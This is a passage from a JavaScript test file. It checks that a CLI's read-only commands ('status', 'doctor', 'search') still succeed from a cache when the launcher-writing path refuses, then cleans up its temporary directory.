      // Only the launcher-WRITING path refuses. Read-only commands from the same cache still work.
      for (const args of [['status'], ['doctor'], ['search', 'anything']]) {
        const r = run(...args);
        const label = `${args.join(' ')}\n--- stdout ---\n${r.stdout}\n--- stderr ---\n${r.stderr}`;
        expect(r.status, label).toBe(0);
      }
    } finally {
      fs.rmSync(base, { recursive: true, force: true });
    }
  }, 300_000);
});
